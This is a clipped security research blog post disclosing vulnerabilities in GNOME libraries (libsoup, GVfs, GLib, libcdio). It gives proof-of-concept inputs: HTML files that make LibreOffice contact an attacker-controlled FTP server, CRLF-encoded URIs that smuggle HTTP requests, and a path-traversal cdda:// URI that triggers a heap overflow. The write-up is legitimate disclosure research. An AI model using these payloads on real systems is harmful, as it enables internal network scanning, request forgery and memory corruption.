---
title: "Breaking GNOME: the core"
source: https://codeanlabs.com/2026/10/breaking-gnome-the-core/
source_host: codeanlabs.com
clip_date: 2026-11-09T10:23:43+08:00
trace_id: b6bc7889-545a-4cc0-ad1c-3fa3d61f4b89
content_hash: 4ba35a63513e148efbe05204b1baf4aeece90f676153504ee51a153b934bbeab
status: synced
tags: []
series: null
feed_source: Codean Labs·漏洞研究
ai_summary: null
ai_summary_style: null
images_status:
  total: 0
  succeeded: 0
  failed_urls: []
notion_page_id: 41375244-d011-8176-a932-f93c8ccfb3c3
ioc:
  cves:
    - CVE-2026-1467
    - CVE-2026-2443
    - CVE-2026-28295
    - CVE-2026-34078
    - CVE-2026-3632
  cwes: []
  hashes: []
  domains: []
  tools: []
  techniques: []
---

## TL;DR

This write-up is the first part of a two part series on vulnerabilities we discovered during a large security evaluation of many GNOME(-adjacent) libraries and applications including the Flatpak sandbox.

We’ll cover the most interesting and fun bugs we found in *GLib*, *libsoup*, *GIO*, and *GVfs*, highlighting the broad impact that vulnerabilities in such widely used libraries can have.  
This write-up includes the detailed explanation of **CVE-2026-1467**, **CVE-2026-28295** and **CVE-2026-2443** together with an interesting heap write primitive in libcdio.

Part 2 will cover sandboxing issues in Flatpak, including a **full sandbox escape**!

BTW, do you remember when we used to read code to find bugs? Yeah that’s what we did to find these issues back when the project was performed. Crazy, am I right?

## Introduction

Sovereign Tech Agency engaged Codean Labs to perform a white-box security evaluation of several projects within the GNOME ecosystem. GNOME components and software are widely used across the Linux desktop landscape, with GNOME serving as the default environment for Ubuntu Desktop, among others.  
Our assessment focused on the core libraries of the GNOME environment, aiming to identify issues that could have a significant impact on applications relying on these libraries for their implementation.  
When it comes to libraries, especially core or standard ones, there are many important security considerations.  
Classic vulnerabilities, incorrect assumptions about security responsibilities, and missing or unclear security boundaries can all lead to hard to detect flaws.

## What will we mess with?

Before diving into some of the issues we found, let’s get a clear idea of what we’re going to be playing with.

### GLib

GLib is a general-purpose, portable utility library, which provides many useful data types, macros, type conversions, string utilities, file utilities, an event loop abstraction, and so on.

It represents the core library for many GNOME-based applications and provides all the building blocks needed to other GNOME libraries to implement their features.

### Gio

Gio is a library providing useful classes for general purpose I/O, networking, IPC, settings, and other high level application functionality.

### GVfs

GVfs is a userspace virtual filesystem implementation for GIO. GVfs comes with a set of backends, including trash support, SFTP, SMB, HTTP, DAV, and many others.

## libsoup

libsoup is an HTTP client/server library for GNOME. It uses the GLib main loop to integrate with GNOME applications and has a synchronous API for use in CLI tools.

## The issues

Now that we know what our targets are, let’s dive into some of the most interesting issues we found:

## CVE-2026-2443: Heap and requests history leak abusing libsoup server

The libsoup’s HTTP server implementation supports the handling of partial GET requests, performed using the [`Range`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Range) header.

The HTTP Range request header indicates the part of a resource that the server should return. Partial requests are handled by the `handle_partial_get()` function that uses the `g_bytes_new_from_bytes()` function to create a slice of the original resource:

```c
  GBytes *range_buf;
  /* Single range, so just set Content-Range and fix the body. */
  soup_message_headers_set_content_range (response_headers,
                                          ranges[0].start,
                                          ranges[0].end,
                                          g_bytes_get_size (full_response));
  g_print("calling g_bytes_new_from_bytes with offset = %ld and length = %ld", ranges[0].start, ranges[0].end-ranges[0].start+1);
  // Call to g_bytes_new_from_bytes 
  range_buf = g_bytes_new_from_bytes (full_response,
                                      ranges[0].start,
                                      ranges[0].end - ranges[0].start + 1);
  soup_message_body_append_bytes (response_body, range_buf);
  g_bytes_unref (range_buf);
```

The `g_bytes_new_from_bytes()` function behaves differently depending on GLib being compiled with the `G_DISABLE_CHECKS` option or not. Specifically all the calls to `g_return_val_if_fail()` function are removed when GLib is compiled with the `G_DISABLE_CHECKS` compiler flag.

As a result, `g_bytes_new_from_bytes()` may create a slice that extends beyond the bounds of the original `GBytes` object:

```c
GBytes *
g_bytes_new_from_bytes (GBytes  *bytes,
                        gsize    offset,
                        gsize    length)
{
  gchar *base;

  /* Compiled out with option G_DISABLE_CHECKS

  g_return_val_if_fail (bytes != NULL, NULL);
  g_return_val_if_fail (offset <= bytes->size, NULL);
  g_return_val_if_fail (offset + length <= bytes->size, NULL);
  */
  if (offset == 0 && length == bytes->size)
    return g_bytes_ref (bytes);
  base = (gchar *)bytes->data + offset;
  while (bytes->free_func == (gpointer)g_bytes_unref)
    bytes = bytes->user_data;
  /* Compiled out with option G_DISABLE_CHECKS
  
  g_return_val_if_fail (bytes != NULL, NULL);
  g_return_val_if_fail (base >= (gchar *)bytes->data, NULL);
  g_return_val_if_fail (base <= (gchar *)bytes->data + bytes->size, NULL);
  g_return_val_if_fail (base + length <= (gchar *)bytes->data + bytes->size, NULL);
  */
  return g_bytes_new_with_free_func (base, length,
                                     (GDestroyNotify)g_bytes_unref, g_bytes_ref (bytes));
}
```

The `soup_message_headers_get_ranges_internal()` function is responsible for checking whether the requested range is valid. However, it only validates the starting offset: if `cur.start >= total_length` (where `total_length` is the size of the response body), the request is rejected with the `416 Requested Range Not Satisfiable` status. No validation is performed on `cur.end`, meaning an attacker can supply an extremely large end value. This leads to a call to `g_bytes_new_from_bytes()` with an oversized `length` parameter.

By sending a request with a valid offset but an excessively large length, an attacker can trigger an out-of-bounds read, leaking a large portion of heap memory that also includes the **body of previous requests**.

While the `G_DISABLE_CHECKS` compiler flag is not intended to have a security impact, it can remove checks that developers take for granted, creating a gap between what is actually happening and what the developer assumes is happening. When this occurs, it becomes easy for developers to make mistakes that can lead to security vulnerabilities, as shown in this case.

### Introducing our new favorite vector: LibreOffice

The following issues target GVfs back-ends that are used in mount and access operation by Gio.  
An example scenario in which these vulnerabilities become interesting is LibreOffice: when opening documents it uses Gio and GVfs to fetch remote image locations, exposing a wide attack surface.  
We can leverage this behavior to reach almost all back-end logic available in GVfs, making a LibreOffice document file a perfect vector for basically every Gio and GVfs vulnerability.  
In situations where LibreOffice is executed on a headless server (via `libreoffice-convert` or similar software) to e.g. convert documents to PDF, the potential impact becomes even more severe.

## CVE-2026-28295: PASV port scanning abusing GVfs

The GVfs virtual filesystem comes with an FTP back-end that supports the PASV (Passive Mode).  
The function `g_vfs_ftp_task_setup_data_connection_pasv()` is responsible for the handling of PASV responses. It constructs a `GInetSocketAddress` with the information provided by the FTP server without any verification and connects to that address using the `g_vfs_ftp_connection_open_data_connection()` function:

```c
status = g_vfs_ftp_task_send_and_check (task, 0, NULL, NULL, &reply, "PASV");
if (status == 0)
  return G_VFS_FTP_METHOD_ANY;

/* parse response and try to find the address to connect to.
 * This code does the same as curl.
 */
for (s = reply[0]; *s; s++)
  {
    if (sscanf (s, "%u,%u,%u,%u,%u,%u",
      	 &ip1, &ip2, &ip3, &ip4,
      	 &port1, &port2) == 6)
     break;
  }
if (*s == 0)
  {
    g_strfreev (reply);
    g_set_error_literal (&task->error, G_IO_ERROR, G_IO_ERROR_FAILED,
      		   _("Invalid reply"));
    return G_VFS_FTP_METHOD_ANY;
  }
g_strfreev (reply);

if (method == G_VFS_FTP_METHOD_PASV || method == G_VFS_FTP_METHOD_ANY)
  {
    guint8 ip[4];
    GInetAddress *inet_addr;

    ip[0] = ip1;
    ip[1] = ip2;
    ip[2] = ip3;
    ip[3] = ip4;
    inet_addr = g_inet_address_new_from_bytes (ip, G_SOCKET_FAMILY_IPV4);
    addr = g_inet_socket_address_new (inet_addr, port1 << 8 | port2);
    g_object_unref (inet_addr);

    success = g_vfs_ftp_connection_open_data_connection (task->conn,
                                                         addr,
                                                         task->cancellable,
                                                         &task->error);
```

A client connecting to a malicious server can therefore be used as a port scanning vector by the malicious FTP server owner in order to gain knowledge on the internal network infrastructure.

**LibreOffice Proof of Concept**

We can leverage LibreOffice as a vector for this vulnerability by embedding image tags that force an FTP connection to an attacker-controlled FTP server in a document. The simplest way to do this is via an HTML file:

```html
<html>
    <img src="ftp://anonymous:@attacker-controlled-ftp-server/test">
</html> 
```

Opening this file with LibreOffice will trigger a connection to the malicious FTP server, enabling the port scanning primitive.

A proof of concept malicious FTP server can be found in [our PoC repository](https://github.com/codean-labs/pocs/tree/main/CVE-2026-28295%20\(GVfs\)).

## CVE-2026-3632: Request smuggling controlling abusing the g_uri_get_host() function

When libsoup is used as a client to send a request (a message), `soup_message_set_request_host_from_uri()` is eventually invoked by `soup_session_send_queue_item()`. This function takes the host component from a `GUri` using `g_uri_get_host()`, and inserts this literally as a `Host` header value.

The `g_uri_get_host()` function returns the URI hostname value URL-decoded, without enforcing any check on the resulting string. Because of that, the returned string may contain any character, even ones that are normally not part of a hostname, including `\r` and `\n`. Hence, it is possible to insert CRLF sequences into the `Host` header value, effectively allowing the insertion of arbitrary headers, and even full requests.  
For example, the following `gio cat` operation:

```bash
gio cat "http://a>%5d%0d%0a%0d%0a%0d%0a%0d%0aPOST%20%2ffoo%20HTTP%2f1.1%0d%0aHost%3a%20localhost%0d%0aA%3a%20.localhost:8000/a"
```

results in the following data being sent to the HTTP server:

```bash
GET /a HTTP/1.1
Accept-Encoding: gzip, deflate
User-Agent: gvfs/1.58.0
Accept-Language: en-us, en;q=0.9
Connection: Keep-Alive
Host: [a]

POST /foo HTTP/1.1
Host: localhost
A: .localhost]:8000
```

Many HTTP servers will interpret this as two HTTP requests and process both, enabling an *HTTP smuggling* attack. We tested this to work with `nginx` for example:

```bash
172.17.0.1 - - [20/Apr/2026:08:49:00 +0000] "GET /a HTTP/1.1" 404 153 "-" "gvfs/1.58.0" "-"
172.17.0.1 - - [20/Apr/2026:08:49:00 +0000] "POST /foo HTTP/1.1" 404 153 "-" "-" "-"
```

Such an attack only works on hosts which do not require DNS to be used to resolve the subdomain. Even a wildcard subdomain will not allow an attacker to perform this attack on arbitrary hosts, as the DNS resolving process will fail due to the invalid characters. Hence, it is mostly useful against `/etc/hosts` -defined names, and `localhost`.

By exploiting this issue, we can transform any GET Server-Side Request Forgery (SSRF) issue related to the usage of GIO to fully controlled arbitrary-verb SSRF.

**LibreOffice Proof of Concept**

Since LibreOffice uses GIO and GVFs to read remote image paths which may be present in a document, opening LibreOffice on a malicious file could trigger this issue allowing an attacker to perform arbitrary requests to hosts not requiring DNS, like `localhost`. In situations where LibreOffice is executed on a headless server (e.g., via `libreoffice-convert` or similar software) to convert documents to PDF, the impact is even more severe, allowing an attacker to perform arbitrary requests to internal endpoints.

An easy way to verify this behavior is to open an HTML file using LibreOffice. Opening the following file will trigger a fully controllable POST request to `localhost:8000/foo`.

```markdown
<html>
	<img src="archive://http%3A%2F%2Fa%5d%250d%250a%250d%250a%250d%250a%250d%250aPOST%2520%25252ffoo%2520HTTP%25252f1%2E1%250d%250aHost%25253a%2520localhost%250d%250aA%25253a%2520%2Elocalhost%3A8080%2Fa">
</html>

```

(We use `archive://` to force the usage of GVfs’s `http` handler, as opposed to LibreOffice’s internal curl-based one)

## Unexpectedly reachable: Heap buffer overflows in libcdio

When it comes to auditing open source software, especially legacy or core code, we’ve all at least once found some forgotten dependencies that not even the developers remember or take into account when it comes to security design. That’s exactly what this issue is about.

While reviewing the libsoup URI parser, implemented by the `g_uri_parse()` function, we noticed that the parsed properties, stored in a `GUri` object, were URL decoded and accepted, even when violating the URI RFC. Since URI parsers having lax implementations of the RFC specifics is not unusual, we can move on and look into GVfs. Let’s just keep in mind that `http://foo%2f%2e%2e%2fbar` will result in a parsed hostname of `foo/../bar`.

The CD-DA (CD Digital Audio) GVfs backend makes use of the `libcdio` library to read physically inserted audio CDs. However, `libcdio` also supports `.toc` and `.bin/.cue` archive images. Both the archive parsers do not validate the number of provided tracks before reading them into a heap-allocated buffer, leading to a heap-based buffer overflow, where a significant part of the written content is controlled via the contents of the provided file.  
For example, the following was a snippet from `cdrdao.c` ‘s `parse_tocfile()`, where it increments the track counter `i` when the `TRACK` keyword is found, without validating it against a maximum value:

```cpp
(...)
/* TRACK <track-mode> [<sub-channel-mode>] */
} else if (0 == strcmp ("TRACK", psz_keyword)) {
  i++;
  if (NULL != (psz_field = strtok (NULL, " \t\n\r"))) {
    if (0 == strcmp ("AUDIO", psz_field)) {
      if (NULL != cd) {
        cd->tocent[i].track_format = TRACK_FORMAT_AUDIO;
        (...)
```

The array `cd->tocent` corresponds to a buffer defined as follows, where `CDIO_CD_MAX_TRACKS` is defined as 99:

```c
  track_info_t  tocent[CDIO_CD_MAX_TRACKS+1]; /* entry info for each track
```

In the main parsing loop, the variable `i` is a regular `int`, hence this counter can overflow the buffer many times over. The struct `track_info_t` consist of several flag fields which are partly controllable, several string pointers whose contents can be controlled per track (e.g., `filename`, `isrc`) and various offset and length (`lba`) fields, which are almost all fully controllable through numeric track properties.

In `bincue.c`, a similar vulnerability is present in `parse_cuefile()`, where `i` is defined and used in a similar manner, although for some fields `cd->gen.i_tracks` is used instead of `i` to index into `cd->tocent[]`:

```c
if (cd) {
  this_track = &(cd->tocent[cd->gen.i_tracks]);
  this_track->track_num   = cd->gen.i_tracks;
  this_track->num_indices = 0;
  b_first_index_for_track = false;
  cd->gen.i_tracks++;
}
```

As `i_tracks` is defined as `track_t` which corresponds to `uint8_t`, hence, this wraps every 255 tracks. This is however unlikely to impact the overall exploitability.

This library is intended to be used to parse the content of physical CDs, and while the issue is quite straightforward, the chance to actually be able to exploit it seemed to be low. We discussed this with the `libcdio` developers, and they said to us that:

*“The likelihood that the problems in the CD image parsers could really be used in malware is pretty slim. First, a faulty image driver would need to be written as an Audio CD, and then an attempt to read an Audio CD from the faulty image would need to be triggered.”*

Since *pretty slim chance* sounds way better than *no chance*, we decided to check how GVfs interacts with the CD-DA parser.

The GVfs backend expects a mount specification where the host component matches a CD device name, e.g.: `cdda://sr0`. The following logic is used to derive the device path (`/dev/sr0` in the example) from this mount specification:

```c
host = g_mount_spec_get (mount_spec, "host");
(...)
cdda_backend->device_path = g_strdup_printf ("/dev/%s", host);
```

However, due to the previously described issue, it is possible for hostnames to contain arbitrary characters, including `/` and `.`. This allows one to traverse the filesystem and set `device_path` to point to an arbitrary file outside of `/dev/`. This unintentionally exposes the `libcdio` image parsing logic as attack surface to anyone with control over URLs mounted using GVfs.

**How does LibreOffice come into play?**

As we said, LibreOffice became our new favorite vector, so let’s use it one last time. We could make `libcdio` parse any file on the disk, but how to place a malicious file in a known location, with arbitrary content?  
One way is to abuse how `gio mount` interacts with the FUSE filesystem: The `mount` operation performed on an `archive` URI, e.g.: `archive://http%253A%252F%252Flocalhost%253A8000%252Ftest.zip/` results in the creation of the `/run/user/$UID/gvfs/archive:host=http%253A%252F%252Flocalhost%253A8000%252Ftest.zip` folder. Then it becomes possible to exploit the path traversal in GVfs to access it and trigger the `libcdio` heap overflow via the `cdda` URI: `cdda://..%2Frun%2Fuser%2F1001%2Fgvfs%2Farchive%3Ahost%3Dhttp%25253A%25252F%25252Flocalhost%25253A8000%25252Ftest%2Ezip%2Fpc%5Fcontrol%2Etoc`.

Given all that, we could:

1.  Host a ZIP archive on a controlled HTTP server (in this example, on `127.0.0.1:8000`)
2.  Fetch it and mount it as an accessible folder located at a known path
3.  Abuse the path traversal to force `libcdio` to parse a malicious file and trigger the heap overflow
4.  Exploit the issue using LibreOffice as a vector, by opening with it the following file:

```cpp
<html>
  <img src="archive://http%253A%252F%252Flocalhost%253A8000%252Ftest.zip/">
  <img src="cdda://..%2Frun%2Fuser%2F1001%2Fgvfs%2Farchive%3Ahost%3Dhttp%25253A%25252F%25252Flocalhost%25253A8000%25252Ftest%2Ezip%2Fpc%5Fcontrol%2Etoc">
</html>
```

## More to come

This was just part one, so stay tuned for the next ones!  
In part 2 we’ll dive into Flatpak and the issues we found in it, including a complete sandbox bypass, [CVE-2026-34078](https://nvd.nist.gov/vuln/detail/cve-2026-34078)!

The content of this blogpost series, together with some super exciting extras, was showcased at [Romhack camp](https://romhack.io/##) and will be presented at [Defcamp](https://def.camp/) too!
